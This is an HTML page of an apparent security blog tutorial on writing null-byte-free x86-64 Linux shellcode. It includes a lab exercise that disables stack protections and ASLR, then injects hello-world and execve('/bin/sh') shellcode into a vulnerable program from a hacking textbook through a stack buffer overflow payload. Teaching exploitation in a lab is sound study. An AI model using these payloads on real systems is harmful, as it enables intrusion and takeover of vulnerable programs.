@@ -1,0 +1,409 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-bvzihdzo> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.15.4"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.github.io/blog/write-your-own-shellcode/"><!-- Primary Meta Tags --><title>Write your own shellcode</title><meta name="title" content="Write your own shellcode"><meta name="description" content="todo"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.github.io/blog/write-your-own-shellcode/"><meta property="og:title" content="Write your own shellcode"><meta property="og:description" content="todo"><meta property="og:image" content="https://danielorihuela.github.io/blog-placeholder-1.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.github.io/blog/write-your-own-shellcode/"><meta property="twitter:title" content="Write your own shellcode"><meta property="twitter:description" content="todo"><meta property="twitter:image" content="https://danielorihuela.github.io/blog-placeholder-1.jpg"><link rel="stylesheet" href="/_astro/_slug_.BVZF4iwd.css">
+<style>code[class*=language-],pre[class*=language-]{color:#f5f5f5;text-shadow:0 0 2px #100c0f,0 0 5px rgba(220,7,142,.2),0 0 10px rgba(255,255,255,.2);background:none;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#34294f}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#969896}.token.punctuation{color:#ccc}.token.selector{color:#72f1b8;text-shadow:0 0 2px #100c0f,0 0 10px rgba(37,124,85,.4588235294),0 0 35px rgba(33,39,36,.4588235294)}.token.function-name{color:#6196cc}.token.constant,.token.symbol{color:#f92aad;text-shadow:0 0 2px #100c0f,0 0 5px rgba(220,7,142,.2),0 0 10px rgba(255,255,255,.2)}.token.attr-value,.token.char,.token.regex,.token.variable{color:#f87c32}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}.token.string{color:#90ee90}.token.class-name,.token.deleted,.token.directive.keyword+.token.string,.token.hexcode,.token.namespace,.token.tag,.token.unit{color:#fff;text-shadow:0 0 1px #ff4d4d,0 0 2px #ff4d4d,0 0 4px #ff4d4d,0 0 10px #ff4d4d,0 0 20px #ff4d4d}.token.macro{color:#fff;text-shadow:0 0 1px #f8d132,0 0 2px #f8d132,0 0 4px #f8d132,0 0 10px #f8d132,0 0 20px #f8d132}.token.attr-name,.token.boolean,.token.function,.token.selector .token.id{color:#fff;text-shadow:0 0 1px #00f2ff,0 0 2px #00f2ff,0 0 4px #00f2ff,0 0 10px #00f2ff,0 0 20px #00f2ff}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector .token.class,.token.token.directive-hash{color:#fff;text-shadow:0 0 1px #bd32f8,0 0 2px #bd32f8,0 0 4px #bd32f8,0 0 10px #bd32f8,0 0 20px #bd32f8}main[data-astro-cid-bvzihdzo]{width:100%;background-color:#222}.hero-image[data-astro-cid-bvzihdzo]{width:40ch;max-width:100%;margin:auto}.hero-image[data-astro-cid-bvzihdzo] img[data-astro-cid-bvzihdzo]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-bvzihdzo]{width:80ch;max-width:100%;margin:auto;color:#d3d3d3}.title[data-astro-cid-bvzihdzo]{margin-bottom:1rem;padding:1rem 0;text-align:center;line-height:1}.title[data-astro-cid-bvzihdzo] h1[data-astro-cid-bvzihdzo]{margin:0 0 .5rem}.date[data-astro-cid-bvzihdzo]{margin-bottom:.5rem;color:#fff}.last-updated-on[data-astro-cid-bvzihdzo]{font-style:italic}.title-name[data-astro-cid-bvzihdzo]{font-family:Iceland;color:#fff}.prose[data-astro-cid-bvzihdzo] img{display:flex;margin:0 auto 2em}.prose[data-astro-cid-bvzihdzo] p{margin-bottom:2em}
+</style></head> <body data-astro-cid-bvzihdzo> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Home </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> About </a>  <a href="/blog" class="active" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Blog </a>  <a href="/open-source" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Open Source </a>  </div> </nav> </header>  <main data-astro-cid-bvzihdzo> <article data-astro-cid-bvzihdzo> <div class="hero-image" data-astro-cid-bvzihdzo> <img src="/_astro/write-shellcode.BPuIU2Up_Z1GWFWX.webp" alt="" data-astro-cid-bvzihdzo width="1024" height="1024" loading="lazy" decoding="async"> </div> <div class="prose" data-astro-cid-bvzihdzo> <div class="title" data-astro-cid-bvzihdzo> <div class="date" data-astro-cid-bvzihdzo> <time datetime="2024-10-24T00:00:00.000Z"> Oct 24, 2024 </time>  </div> <h1 class="title-name" data-astro-cid-bvzihdzo>Write your own shellcode</h1> <hr data-astro-cid-bvzihdzo> </div>  <ul>
+<li><a href="#whats-a-shellcode">What’s a shellcode?</a></li>
+<li><a href="#building-a-shellcode">Building a shellcode</a>
+<ul>
+<li><a href="#hello-world-assembly">Hello world assembly</a></li>
+<li><a href="#no-segments">No segments</a></li>
+<li><a href="#no-null-bytes">No null bytes</a>
+<ul>
+<li><a href="#jump-to-the-end-and-back">Jump to the end and back</a></li>
+<li><a href="#use-smaller-registers">Use smaller registers</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#experiment-with-shellcode-injection">Experiment with shellcode
+injection</a></li>
+</ul>
+<h1 id="whats-a-shellcode">What’s a shellcode?</h1>
+<p>In the software realm, a shellcode is a set of instructions that
+attackers inject into a program to execute arbitrary commands. Commonly,
+they use it to spawn a shell. However, you can do whatever you wish to.
+For example, print something to stdout, create files, and open a port,
+to name a few.</p>
+<p>In this post, I will show you the basics of building a shellcode and how
+to avoid the most common pitfalls when executing it in an exploit.</p>
+<h1 id="building-a-shellcode">Building a shellcode</h1>
+<p>A shellcode is built in assembly. Why assembly? Because they are
+injected into running programs that are already compiled, assembled, and
+linked. Once in runtime, the CPU is just reading machine instructions.
+Thus, we need to inject assembly instructions.</p>
+<p>Building an assembly program can seem hard but there are lots of
+resources where you can learn about it.</p>
+<ul>
+<li><a href="https://github.com/mschwartz/assembly-tutorial?tab=readme-ov-file">https://github.com/mschwartz/assembly-tutorial?tab=readme-ov-file</a></li>
+<li><a href="https://nasm.us/docs.php">https://nasm.us/docs.php</a></li>
+<li><a href="https://learnxinyminutes.com/docs/mips/">https://learnxinyminutes.com/docs/mips/</a></li>
+<li><a href="https://cs.lmu.edu/~ray/notes/nasmtutorial/">https://cs.lmu.edu/~ray/notes/nasmtutorial/</a></li>
+<li><a href="https://portal.cs.umbc.edu/help/nasm/sample_64.shtml">https://portal.cs.umbc.edu/help/nasm/sample_64.shtml</a></li>
+</ul>
+<p>You must also know where to get the machine instructions for a given
+architecture. You can get the information from the system. For example,
+my 64-bit Linux machine has the file
+<code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code> with the information.</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">_ASM_UNISTD_64_H</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_ASM_UNISTD_64_H</span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__NR_read</span> <span class="token expression"><span class="token number">0</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__NR_write</span> <span class="token expression"><span class="token number">1</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__NR_open</span> <span class="token expression"><span class="token number">2</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__NR_close</span> <span class="token expression"><span class="token number">3</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__NR_stat</span> <span class="token expression"><span class="token number">4</span></span></span>
+</code></pre>
+<p>Alternatively, you can search for that information on the Internet, for
+example,
+<a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a> or
+<a href="https://j00ru.vexillium.org/syscalls/nt/64/">https://j00ru.vexillium.org/syscalls/nt/64/</a>.</p>
+<p>Let’s start writing a simple program to print to the stdout.</p>
+<h2 id="hello-world-assembly">Hello world assembly</h2>
+<pre class="language-nasm" data-language="nasm"><code is:raw="" class="language-nasm"><span class="token keyword">BITS 64</span> <span class="token comment">; Define target architecture bits</span>
+
+<span class="token keyword">section .data</span> <span class="token comment">; Data segment</span>
+msg db <span class="token string">"Hello, world!"</span>, <span class="token number">0x0a</span><span class="token comment">; String with new line char</span>
+
+<span class="token keyword">section .text</span> <span class="token comment">; Text segment</span>
+<span class="token keyword">global _start</span><span class="token comment">; Default entry point for ELF linking</span>
+
+<span class="token label function">_start:</span>
+
+<span class="token comment">; write</span>
+mov <span class="token register variable">rax</span>, <span class="token number">1</span> <span class="token comment">; Specify write syscall</span>
+mov <span class="token register variable">rbx</span>, <span class="token number">1</span> <span class="token comment">; Specify stdout by putting 1 into rbx</span>
+mov <span class="token register variable">rsi</span>, msg <span class="token comment">; Put the address of the string into rsi</span>
+mov <span class="token register variable">rdx</span>, <span class="token number">14</span> <span class="token comment">; Put the length of the string into rdx</span>
+syscall <span class="token comment">; Execute the system call</span>
+
+<span class="token comment">; exit</span>
+mov <span class="token register variable">rax</span>, <span class="token number">60</span> <span class="token comment">; Specify exit syscall</span>
+mov <span class="token register variable">rbx</span>, <span class="token number">0</span> <span class="token comment">; Exit with success</span>
+syscall <span class="token comment">; Execute the system call</span>
+</code></pre>
+<p>The program is simple. We define the target architecture bits, create a
+static string, and print it into stdout. Assembling, linking, and
+executing the binary is also very simple.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">nasm <span class="token parameter variable">-f</span> elf64 helloworld.asm
+ld helloworld.o
+./a.out
+</code></pre>
+<p>See how it works and experiment a bit.</p>
+<p>Taking that program as a basis, we will now see the different
+restrictions that we have to build a fully functional shellcode.</p>
+<h2 id="no-segments">No segments</h2>
+<p>We inject shellcodes into running programs. Hence, we cannot specify the
+data layout nor use other data segments like in the previous example.
+The instructions must be self-contained. For instance, we cannot declare
+a static string. We need to mix it with the other instructions.</p>
+<p>Removing the segments is easy, but… how can we mix the string? The stack
+will be our ally. Remember that when calling a function, a stack frame
+is created with the arguments, the local variables, and the return
+address. We can misuse that in assembly to load a string. The idea is to
+place the string directly after a call instruction. That way the return
+address of the stack will match the address of the string and we will be
+able to retrieve it inside the function.</p>
+<pre class="language-nasm" data-language="nasm"><code is:raw="" class="language-nasm"><span class="token keyword">BITS 64</span>
+
+call below
+db <span class="token string">"Hello, world!"</span>, <span class="token number">0x0a</span>
+
+<span class="token label function">below:</span>
+<span class="token comment">; write</span>
+mov <span class="token register variable">rax</span>, <span class="token number">1</span>
+mov <span class="token register variable">rdi</span>, <span class="token number">1</span>
+<span class="token comment">; Pop the value from the return address </span>
+<span class="token comment">; and store it into the register</span>
+pop <span class="token register variable">rsi</span> 
+mov <span class="token register variable">rdx</span>, <span class="token number">14</span>
+syscall
+
+<span class="token comment">; exit</span>
+mov <span class="token register variable">rax</span>, <span class="token number">60</span>
+mov <span class="token register variable">rdi</span>, <span class="token number">0</span>
+syscall
+</code></pre>
+<p>Try it out and experiment with it.</p>
+<p>In some situations that’s the only technique you will need to inject a
+shellcode. However, there are some occasions where this may fall short
+and you will get a segmentation fault. Often, shellcodes are injected as
+strings with functions like <code>strcpy</code>. These types of functions terminate
+at the first null byte. If we want it to work as expected, we must
+remove the null bytes.</p>
+<h2 id="no-null-bytes">No null bytes</h2>
+<p>There are different techniques to remove null bytes. Let’s see our
+starting point.</p>
+<pre class="language-plaintext" data-language="plaintext"><code is:raw="" class="language-plaintext">nasm helloworld.asm
+hexdump -C helloword
+</code></pre>
+<p><img  src="/_astro/hexdump-t0.C5YlI_yk_4c63G.webp" alt="" width="715" height="115" loading="lazy" decoding="async"></p>
+<p>Notice how many <code>00</code> are there. These are the null bytes.</p>
+<h3 id="jump-to-the-end-and-back">Jump to the end and back</h3>
+<p><code>call</code> instructions allow for “long” jumps. Using it for “small” jumps
+as we are doing in our shellcode means that the operand doesn’t fill the
+entire space reserved for the operand value, and it gets padded with
+null bytes.</p>
+<p>We can us the two’s complement to avoid that. If we pass a negative
+number to the <code>call</code> instruction, the value will be padded with <code>0xff</code>
+instead of null bytes. A standard implementation of this solution
+consists of jumping to the end of the assembly program to a <code>call</code>
+instruction that will jump back to a function.</p>
+<pre class="language-nasm" data-language="nasm"><code is:raw="" class="language-nasm"><span class="token keyword">BITS 64</span>
+
+jmp short bottom
+
+<span class="token label function">above:</span>
+<span class="token comment">; write</span>
+mov <span class="token register variable">rax</span>, <span class="token number">1</span>
+mov <span class="token register variable">rdi</span>, <span class="token number">1</span>
+pop <span class="token register variable">rsi</span>
+mov <span class="token register variable">rdx</span>, <span class="token number">14</span>
+syscall
+
+<span class="token comment">; exit</span>
+mov <span class="token register variable">rax</span>, <span class="token number">60</span>
+mov <span class="token register variable">rdi</span>, <span class="token number">0</span>
+syscall
+
+<span class="token label function">bottom:</span>
+call above
+db <span class="token string">"Hello, world!"</span>, <span class="token number">0x0a</span>
+</code></pre>
+<p><img  src="/_astro/hexdump-t1.BVgF98mI_ZBw0PM.webp" alt="" width="716" height="111" loading="lazy" decoding="async"></p>
+<p>We removed some null bytes.</p>
+<h3 id="use-smaller-registers">Use smaller registers</h3>
+<p>Computers have 16 registers. 64-bit registers are built on top of old
+registers. For instance, EAX is part of RAX and it contains its first 32
+bits.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>64-bit register</th><th>Lower 32 bits</th><th>Lower 16 bits</th><th>Lower 8 bits</th></tr></thead><tbody><tr><td>rax</td><td>eax</td><td>ax</td><td>al</td></tr><tr><td>rbx</td><td>ebx</td><td>bx</td><td>bl</td></tr><tr><td>rcx</td><td>ecx</td><td>cx</td><td>cl</td></tr><tr><td>rdx</td><td>edx</td><td>dx</td><td>dl</td></tr><tr><td>rsi</td><td>esi</td><td>si</td><td>sil</td></tr><tr><td>rdi</td><td>edi</td><td>di</td><td>dil</td></tr><tr><td>rbp</td><td>ebp</td><td>bp</td><td>bpl</td></tr><tr><td>rsp</td><td>esp</td><td>sp</td><td>spl</td></tr><tr><td>r8</td><td>r8d</td><td>r8w</td><td>r8b</td></tr><tr><td>r9</td><td>r9d</td><td>r9w</td><td>r9b</td></tr><tr><td>r10</td><td>r10d</td><td>r10w</td><td>r10b</td></tr><tr><td>r11</td><td>r11d</td><td>r11w</td><td>r11b</td></tr><tr><td>r12</td><td>r12d</td><td>r12w</td><td>r12b</td></tr><tr><td>r13</td><td>r13d</td><td>r13w</td><td>r13b</td></tr><tr><td>r14</td><td>r14d</td><td>r14w</td><td>r14b</td></tr><tr><td>r15</td><td>r15d</td><td>r15w</td><td>r15b</td></tr></tbody></table>
+<p>When using bigger registers, values are padded with null bytes if they
+can’t fill the space. Therefore, we want to use the smallest register
+possible in each operation. However, the remaining bytes can contain any
+data. We need to zero them out. This can be easily achieved with the xor
+operation. Additionally, calling <code>mov register, 0</code> adds null bytes. We
+need to use <code>dec register</code>.</p>
+<pre class="language-nasm" data-language="nasm"><code is:raw="" class="language-nasm"><span class="token keyword">BITS 64</span>
+
+jmp short bottom
+
+<span class="token label function">above:</span>
+<span class="token comment">; write</span>
+xor <span class="token register variable">rax</span>, <span class="token register variable">rax</span>
+inc <span class="token register variable">al</span>
+xor <span class="token register variable">rdi</span>, <span class="token register variable">rdi</span>
+inc <span class="token register variable">rdi</span>
+pop <span class="token register variable">rsi</span>
+xor <span class="token register variable">rdx</span>, <span class="token register variable">rdx</span>
+mov <span class="token register variable">dl</span>, <span class="token number">14</span>
+syscall
+
+<span class="token comment">; exit</span>
+mov <span class="token register variable">al</span>, <span class="token number">60</span>
+dec <span class="token register variable">rdi</span>
+syscall
+
+<span class="token label function">bottom:</span>
+call above
+db <span class="token string">"Hello, world!"</span>, <span class="token number">0x0a</span>
+</code></pre>
+<p><img  src="/_astro/hexdump-t2.BA2n353f_Z2rEeRj.webp" alt="" width="718" height="89" loading="lazy" decoding="async"></p>
+<p>We removed all the null bytes!!! This is it. Shellcodes are just a
+matter of executing system calls and avoiding null bytes. Let’s try it
+out with a hands-on exercise.</p>
+<h1 id="experiment-with-shellcode-injection">Experiment with shellcode injection</h1>
+<p>Relevant system information:</p>
+<ul>
+<li>Linux 5.15.0-122-generic x86_64</li>
+<li>Intel(R) Core(TM) i7-10510U CPU</li>
+<li>Little Endian</li>
+<li>48 bits address size</li>
+</ul>
+<p>All the vulnerable programs are from Hacking: The Art of Exploitation,
+2nd Edition. Get the source code from
+<a href="https://github.com/intere/hacking/blob/master/booksrc">https://github.com/intere/hacking/blob/master/booksrc</a>.</p>
+<p>We will use two programs from the book: <code>getenvaddr.c</code> and
+<code>notesearch.c</code> (that requires <code>hacking.h</code>). We will store the shellcode
+in an environment variable and inject it into the vulnerable program
+with a stack-based buffer overflow. If you want to learn more about
+stack-based buffer overflows and how to take advantage of the
+environment, you can check <a href="../stack-based-buffer-overflows">Stack-based buffer
+overflows</a> and <a href="../store-shellcode-in-environment-variable">Store shellcode in
+environment variable</a>.</p>
+<p>Let’s compile the programs. Notice how we disable all the security
+measures for the vulnerable program.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">gcc getenvaddr.c <span class="token parameter variable">-o</span> getenvaddr
+gcc notesearch.c <span class="token parameter variable">-o</span> notesearch -fno-stack-protector <span class="token parameter variable">-z</span> execstack -no-pie <span class="token parameter variable">-g</span>
+<span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /proc/sys/kernel/randomize_va_space
+</code></pre>
+<p>Now, we have to:</p>
+<ol>
+<li>Assemble the shellcode</li>
+<li>Export the shellcode into an environment variable</li>
+<li>Check the address of the environment variable from the vulnerable
+program point of view</li>
+<li>Inject the code into the vulnerable program</li>
+</ol>
+<p>Which translates into the following.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">nasm helloworld.asm
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">SHELLCODE</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> helloworld<span class="token variable">)</span></span>
+~/Desktop/getenvaddr SHELLCODE ~/Desktop/notesearch
+~/Desktop/notesearch <span class="token variable"><span class="token variable">$(</span>perl <span class="token parameter variable">-e</span> <span class="token string">'print "\x90" x 120, "\xab\xef\xff\xff\xff\x7f\x00\x00"'</span><span class="token variable">)</span></span>
+</code></pre>
+<p><img  src="/_astro/write-stdout-exploit.PrTDxyvw_CWIQn.webp" alt="" width="1336" height="234" loading="lazy" decoding="async"></p>
+<p>Cool! We managed to take control of the program and print what we wanted
+to the stdout. This is rather dull. Let’s try to get a shell prompt!!!</p>
+<p>What would this look like in C?</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdlib.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>You can try it out with <code>gcc shell.c -o shell; chmod +x shell; ./shell</code>.</p>
+<p>If you search on the internet, you will find that
+<a href="https://man7.org/linux/man-pages/man3/system.3.html">system</a> internally
+calls <a href="https://man7.org/linux/man-pages/man3/execl.3.html">execl</a>, which
+is build on top of the
+<a href="https://man7.org/linux/man-pages/man2/execve.2.html">execve</a> system
+call. Execve receives three parameters: the program, the argument to the
+program, and key-value pairs to be passed as the environment. In our
+case, to spawn a shell, we are only interested in the first argument.
+Overall, building an assembly program that spawns a shell seems easy.
+Just call <code>execve</code> with <code>/bin/sh</code> as the program name.</p>
+<pre class="language-nasm" data-language="nasm"><code is:raw="" class="language-nasm"><span class="token keyword">BITS 64</span>
+
+jmp short bottom
+
+<span class="token label function">above:</span>
+<span class="token comment">; write</span>
+xor <span class="token register variable">rax</span>, <span class="token register variable">rax</span>
+mov <span class="token register variable">al</span>, <span class="token number">59</span>
+xor <span class="token register variable">rdi</span>, <span class="token register variable">rdi</span>
+pop <span class="token register variable">rdi</span>
+xor <span class="token register variable">rsi</span>, <span class="token register variable">rsi</span>
+xor <span class="token register variable">rdx</span>, <span class="token register variable">rdx</span>
+syscall
+
+<span class="token comment">; exit</span>
+mov <span class="token register variable">al</span>, <span class="token number">60</span>
+dec <span class="token register variable">rdi</span>
+syscall
+
+<span class="token label function">bottom:</span>
+call above
+db <span class="token string">"/bin/sh"</span>
+</code></pre>
+<p>Let’s try to inject it.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">nasm shell.asm<span class="token punctuation">;</span> <span class="token punctuation">\</span>
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">SHELLCODE</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> shell<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">\</span>
+~/Desktop/getenvaddr SHELLCODE ~/Desktop/notesearch<span class="token punctuation">;</span> <span class="token punctuation">\</span>
+~/Desktop/notesearch <span class="token variable"><span class="token variable">$(</span>perl <span class="token parameter variable">-e</span> <span class="token string">'print "\x90" x 120, "\xb3\xef\xff\xff\xff\x7f\x00\x00"'</span><span class="token variable">)</span></span>
+</code></pre>
+<p><img  src="/_astro/shell-exploit.y7YkD9m6_28DNPp.webp" alt="" width="1327" height="261" loading="lazy" decoding="async"></p>
+<p>We got shell access!!!</p>  </div> </article> </main> <footer></footer> </body></html>
